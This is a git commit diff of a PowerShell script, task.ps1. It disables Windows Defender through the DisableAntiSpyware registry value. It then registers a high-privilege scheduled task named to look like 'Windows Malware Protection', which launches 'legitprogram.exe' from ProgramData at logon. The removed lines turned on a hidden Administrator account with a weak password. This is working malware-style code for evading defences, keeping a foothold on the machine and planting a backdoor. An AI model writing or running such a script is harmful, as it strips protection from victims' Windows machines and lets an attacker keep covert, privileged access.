f78d688a6106c43e0cf933c686a287d6da6a071e
Nooble <kieranaslett@gmail.com>
2019-02-01 19:03:45 +0000

    Update task.ps1

--- task.ps1
+++ task.ps1
@@ -5,26 +5,10 @@ $Name = "DisableAntiSpyware"
 $value = "1"
 New-ItemProperty -Path $registryPath -Name $name -Value $value -PropertyType DWORD -Force | Out-Null
 
-#Activate Admin and set password
-net user Administrator /active:yes
-net user Administrator Password01
-
-#Add Keys
-New-Item "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts"
-New-Item "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
-
-#Hide Administrator
-$registryPath = "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
-$Name = "Administrator"
-$value = "0"
-New-ItemProperty -Path $registryPath -Name $name -Value $value -PropertyType DWORD -Force | Out-Null
-
 #Create startup Task
-#$Username = (Get-WmiObject -Class Win32_ComputerSystem -Property Name).Name + "\Administrator"
-#$Password = "Password01"
 $triggers = @()
-$triggers += New-JobTrigger -AtStartup
+$triggers += New-JobTrigger -AtLogOn
 $triggers += New-JobTrigger -Once -At (Get-Date).AddMinutes(1)
 $setting = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries
 $action = New-ScheduledTaskAction -Execute 'C:\ProgramData\Windows Malware Protection\legitprogram.exe'
-Register-ScheduledTask -Action $action -Settings $setting -Trigger $triggers -RunLevel Highest -TaskName "Windows Malware Protection" #-User $Username -Password $Password 
+Register-ScheduledTask -Action $action -Settings $setting -Trigger $triggers -RunLevel Highest -TaskName "Windows Malware Protection"
